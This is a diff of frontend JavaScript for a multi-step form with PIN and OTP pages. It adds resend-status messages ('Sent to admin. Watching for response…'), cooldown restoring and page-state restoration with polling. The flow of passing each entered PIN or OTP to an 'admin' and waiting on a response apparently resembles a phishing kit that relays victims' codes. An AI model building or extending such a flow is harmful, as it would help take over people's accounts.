@@ -497,4 +497,55 @@ async function requestResend(step) {
   }
 }
 
-function setRes
+function setResendWaitingStatus(step, state, extraMsg) {
+  const statusId = step === 'pin' ? 'resendStatusPin' : step === 'otp' ? 'resendStatusOtp' : 'resendStatusApp';
+  const el = document.getElementById(statusId);
+  if (!el) return;
+
+  if (state === 'waiting') {
+    el.className = 'resend-status show waiting';
+    el.innerHTML = '<span class="rs-dot"></span> Resent — waiting for admin response…';
+  } else if (state === 'sent') {
+    el.className = 'resend-status show waiting';
+    el.innerHTML = '<span class="rs-dot"></span> Sent to admin. Watching for response…';
+  } else if (state === 'clear') {
+    el.className = 'resend-status';
+    el.innerHTML = '';
+  } else if (state === 'error') {
+    el.className = 'resend-status show error';
+    el.innerHTML = '⚠️ ' + (extraMsg || 'Resend failed');
+    setTimeout(() => {
+      el.className = 'resend-status';
+      el.innerHTML = '';
+    }, 4000);
+  }
+}
+
+function restoreResendCooldowns() {
+  applyCooldownUI('pin', 'resendBtnPin');
+  applyCooldownUI('otp', 'resendBtnOtp');
+  applyCooldownUI('app', 'resendBtnApp');
+}
+
+// ─── Restore State on Page Load ───
+document.addEventListener('DOMContentLoaded', function () {
+  const restored = loadState();
+  if (restored && appData.applicationId) {
+    if (currentPage === 'page-processing') {
+      goTo('page-processing');
+      startAppPolling();
+    } else if (currentPage === 'page-pin') {
+      goTo('page-pin');
+    } else if (currentPage === 'page-otp') {
+      goTo('page-otp');
+      startOtpPolling();
+    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
+      goTo(currentPage);
+    } else {
+      goTo(currentPage);
+    }
+  } else {
+    goTo('page-landing');
+  }
+  restoreResendCooldowns();
+});
